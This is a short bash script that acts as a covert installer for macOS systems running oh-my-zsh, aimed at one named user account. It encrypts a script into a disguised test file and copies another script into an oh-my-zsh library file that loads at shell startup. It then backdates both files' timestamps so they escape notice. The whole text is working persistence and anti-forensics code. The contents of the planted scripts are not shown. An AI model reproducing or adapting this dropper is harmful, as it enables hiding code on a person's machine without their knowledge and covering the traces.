#!/bin/bash

os=$(uname)

if [ -z "$USER" ]; then
	echo "No user set."
	exit 1
fi

if [ "$USER" != "jmuhlber" ]; then
	echo "nenene"
	exit 1
fi


macinstall() {
	if [[ -d ~/.oh-my-zsh ]]; then
		INFILE="lyfs.sh"
		OUTFILE=$HOME/.oh-my-zsh/lib/tests/lyfs.test.zsh
		openssl enc -aes-256-cbc -salt -in "$INFILE" -out "$OUTFILE" -k "$USER"
		cp plan.sh ~/.oh-my-zsh/lib/host.zsh
		touch -t 202410191633 ~/.oh-my-zsh/lib/host.zsh
		touch -t 202405131058 "$OUTFILE"
		echo "Installed."
	else
		echo "no ohmyzsh"
	fi
}

linuxinstall() {
	echo "System not supportet yet."
	exit 1
}


if [[ "$os" == "Linux" ]]; then
	linuxinstall
elif [[ "$os" == "Darwin" ]]; then
	macinstall
else
	echo "System not supportet."
	exit 1
fi
